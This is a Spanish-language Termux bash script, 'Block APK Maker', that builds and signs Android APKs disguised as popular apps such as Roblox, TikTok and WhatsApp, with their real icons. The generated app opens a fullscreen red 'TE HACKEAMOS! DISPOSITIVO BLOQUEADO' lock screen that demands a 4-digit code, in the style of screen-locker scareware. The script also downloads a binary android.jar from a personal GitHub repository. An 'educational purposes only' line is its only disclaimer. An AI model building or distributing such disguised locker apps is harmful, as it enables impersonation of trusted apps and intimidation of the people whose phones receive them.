#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK APK MAKER ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# ICONOS
# ============================================
get_icon_url() {
    case "$1" in
        "Roblox") echo "https://img.icons8.com/color/512/roblox.png" ;;
        "Free Fire") echo "https://img.icons8.com/color/512/free-fire.png" ;;
        "TikTok") echo "https://img.icons8.com/color/512/tiktok.png" ;;
        "Instagram") echo "https://img.icons8.com/color/512/instagram-new.png" ;;
        "Facebook") echo "https://img.icons8.com/color/512/facebook-new.png" ;;
        "WhatsApp") echo "https://img.icons8.com/color/512/whatsapp.png" ;;
        "YouTube") echo "https://img.icons8.com/color/512/youtube-play.png" ;;
        "Minecraft") echo "https://img.icons8.com/color/512/minecraft.png" ;;
        "PUBG Mobile") echo "https://img.icons8.com/color/512/pubg.png" ;;
        "Clash of Clans") echo "https://img.icons8.com/color/512/clash-of-clans.png" ;;
        "Spotify") echo "https://img.icons8.com/color/512/spotify.png" ;;
        "Netflix") echo "https://img.icons8.com/color/512/netflix.png" ;;
        *) echo "" ;;
    esac
}

# ============================================
# MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# GENERAR APK CON AAPT (COMPILADOR REAL)
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código: ${AMARILLO}$codigo${NC}\n"
    
    # ============================================
    # PASO 1: INSTALAR HERRAMIENTAS
    # ============================================
    echo -e "${AMARILLO}[*] Instalando herramientas...${NC}"
    pkg install aapt dx apksigner openjdk-17 wget zip -y 2>/dev/null
    
    # ============================================
    # PASO 2: CREAR CARPETA
    # ============================================
    mkdir -p ~/block_temp
    cd ~/block_temp
    rm -rf *
    
    # ============================================
    # PASO 3: CREAR ESTRUCTURA
    # ============================================
    echo -e "${AMARILLO}[*] Creando estructura...${NC}"
    
    mkdir -p src/com/block/$app
    mkdir -p res/layout
    mkdir -p res/values
    mkdir -p res/drawable
    mkdir -p META-INF
    
    # AndroidManifest.xml
    cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.$app"
    android:versionCode="1"
    android:versionName="1.0">
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="$app"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

    # Layout
    cat > res/layout/main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#CC0000"
    android:padding="30dp">
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="⚠️"
        android:textSize="80sp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="¡TE HACKEAMOS!"
        android:textColor="#FFFFFF"
        android:textSize="34sp"
        android:textStyle="bold"
        android:layout_marginTop="10dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="🔒 DISPOSITIVO BLOQUEADO"
        android:textColor="#FFFF00"
        android:textSize="18sp"
        android:layout_marginTop="5dp" />
    
    <EditText
        android:id="@+id/codigo"
        android:layout_width="220dp"
        android:layout_height="55dp"
        android:background="#FFFFFF"
        android:textColor="#000000"
        android:textSize="28sp"
        android:gravity="center"
        android:inputType="number"
        android:maxLength="4"
        android:layout_marginTop="25dp" />
    
    <Button
        android:id="@+id/desbloquear"
        android:layout_width="220dp"
        android:layout_height="55dp"
        android:text="🔓 DESBLOQUEAR"
        android:textColor="#FFFFFF"
        android:textSize="18sp"
        android:textStyle="bold"
        android:background="#FF0000"
        android:layout_marginTop="15dp" />
    
    <TextView
        android:id="@+id/error"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFF00"
        android:textSize="14sp"
        android:layout_marginTop="10dp" />
        
</LinearLayout>
EOF

    # Strings
    cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$app</string>
</resources>
EOF

    # ============================================
    # PASO 4: DESCARGAR ICONO
    # ============================================
    echo -e "${AMARILLO}[*] Descargando icono...${NC}"
    ICON_URL=$(get_icon_url "$app")
    wget -q -O icon.png "$ICON_URL" 2>/dev/null
    
    if [ ! -f "icon.png" ]; then
        echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
    fi
    cp icon.png res/drawable/ic_launcher.png
    rm -f icon.png

    # ============================================
    # PASO 5: CÓDIGO JAVA
    # ============================================
    cat > src/com/block/$app/MainActivity.java << EOF
package com.block.$app;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity {
    private EditText codigoInput;
    private TextView errorText;
    private String CODIGO_CORRECTO = "$codigo";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        codigoInput = findViewById(R.id.codigo);
        errorText = findViewById(R.id.error);
        Button btn = findViewById(R.id.desbloquear);
        
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String codigo = codigoInput.getText().toString().trim();
                if (codigo.isEmpty()) {
                    errorText.setText("Ingresa el código");
                } else if (codigo.equals(CODIGO_CORRECTO)) {
                    errorText.setText("✅ ¡DESBLOQUEADO!");
                    finish();
                } else {
                    errorText.setText("❌ Código incorrecto");
                }
            }
        });
    }
}
EOF

    # ============================================
    # PASO 6: COMPILAR CON AAPT
    # ============================================
    echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
    
    # Buscar android.jar
    ANDROID_JAR=$(find /data/data/com.termux/files -name "android.jar" 2>/dev/null | head -1)
    
    if [ -z "$ANDROID_JAR" ] || [ ! -f "$ANDROID_JAR" ]; then
        # Descargar android.jar si no existe
        echo -e "${AMARILLO}[*] Descargando android.jar...${NC}"
        mkdir -p ~/android-sdk/platforms/android-33/
        wget -q -O ~/android-sdk/platforms/android-33/android.jar "https://raw.githubusercontent.com/emanuelyoan470/Mi-herramienta/main/android.jar" 2>/dev/null
        ANDROID_JAR=~/android-sdk/platforms/android-33/android.jar
    fi
    
    if [ -f "$ANDROID_JAR" ]; then
        echo -e "${VERDE}[✔] android.jar encontrado${NC}"
        
        # Compilar recursos
        aapt package -f -m -J src -M AndroidManifest.xml -S res -I "$ANDROID_JAR" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "${VERDE}[✔] Recursos compilados${NC}"
        else
            echo -e "${ROJO}[!] Error compilando recursos${NC}"
        fi
        
        # Compilar Java
        echo -e "${AMARILLO}[*] Compilando Java...${NC}"
        javac -cp "$ANDROID_JAR" -d . src/com/block/$app/*.java 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "${VERDE}[✔] Java compilado${NC}"
        else
            echo -e "${ROJO}[!] Error compilando Java${NC}"
        fi
        
        # Crear DEX
        echo -e "${AMARILLO}[*] Creando DEX...${NC}"
        dx --dex --output=classes.dex . 2>/dev/null
        
        if [ -f "classes.dex" ]; then
            echo -e "${VERDE}[✔] DEX creado${NC}"
        fi
        
        # Empaquetar
        echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
        aapt package -f -M AndroidManifest.xml -S res -I "$ANDROID_JAR" -F app_unsigned.apk . 2>/dev/null
        
        if [ -f "classes.dex" ]; then
            zip app_unsigned.apk classes.dex 2>/dev/null
        fi
        
        # Si falla, usar método alternativo
        if [ ! -f "app_unsigned.apk" ]; then
            echo -e "${AMARILLO}[*] Usando método alternativo...${NC}"
            zip -r app_unsigned.apk AndroidManifest.xml res/ META-INF/ 2>/dev/null
            if [ -f "classes.dex" ]; then
                zip app_unsigned.apk classes.dex 2>/dev/null
            fi
        fi
    else
        echo -e "${ROJO}[!] No se encontró android.jar${NC}"
        echo -e "${AMARILLO}[*] Creando APK simple...${NC}"
        
        # Crear APK simple con zip
        zip -r app_unsigned.apk AndroidManifest.xml res/ META-INF/ 2>/dev/null
    fi

    # ============================================
    # PASO 7: FIRMAR
    # ============================================
    if [ -f "app_unsigned.apk" ] && [ -s "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Firmando APK...${NC}"
        
        if [ ! -f ~/debug.keystore ]; then
            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
        fi
        
        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
        
        if [ ! -f "${app}_block.apk" ]; then
            mv app_unsigned.apk "${app}_block.apk"
        fi
    fi

    # ============================================
    # PASO 8: GUARDAR EN DOWNLOADS
    # ============================================
    if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp
        
        echo -e "\n${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA!${NC}"
        echo -e "${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código: ${VERDE}$codigo${NC}"
        echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
        echo -e "  1. Abre 'Descargas' en tu teléfono"
        echo -e "  2. Instala ${VERDE}${app}_block.apk${NC}"
        echo -e "  3. Al abrir, ingresa: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "\n${ROJO}[!] ERROR: No se pudo generar la APK${NC}"
        echo -e "${AMARILLO}[*] Asegúrate de tener conexión a internet${NC}"
        echo -e "${AMARILLO}[*] Ejecuta: pkg install aapt dx apksigner openjdk-17 -y${NC}"
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK APK MAKER ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido (1000-9999)${NC}"
            fi
        done
        
        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida${NC}"
        sleep 2
    fi
done
